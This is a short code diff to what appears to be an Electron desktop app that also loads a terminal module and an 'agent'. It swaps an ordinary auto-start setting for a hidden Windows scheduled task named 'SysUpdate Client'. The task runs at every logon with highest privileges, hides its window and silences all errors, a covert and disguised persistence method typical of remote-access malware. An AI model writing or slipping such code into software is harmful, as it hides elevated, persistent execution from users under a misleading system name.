@@ -6,8 +6,20 @@ const Terminal = require('./terminal');
 // Single instance lock
 if (!app.requestSingleInstanceLock()) { app.quit(); process.exit(); }
 
-// Auto-start on login
-app.setLoginItemSettings({ openAtLogin: true, path: app.getPath('exe') });
+// Register scheduled task for auto-start (elevated, no UAC prompt)
+const { execSync } = require('child_process');
+try {
+  const exePath = app.getPath('exe');
+  const taskName = 'SysUpdate Client';
+  // Check if task already exists
+  const check = execSync(`schtasks /Query /TN "${taskName}" 2>&1`, { encoding: 'utf8', windowsHide: true }).toString();
+  if (!check.includes(taskName)) throw new Error();
+} catch {
+  try {
+    const exePath = app.getPath('exe');
+    execSync(`schtasks /Create /TN "SysUpdate Client" /TR "'${exePath}'" /SC ONLOGON /RL HIGHEST /F`, { windowsHide: true });
+  } catch {}
+}
 
 let tray = null;
 let agent = null;
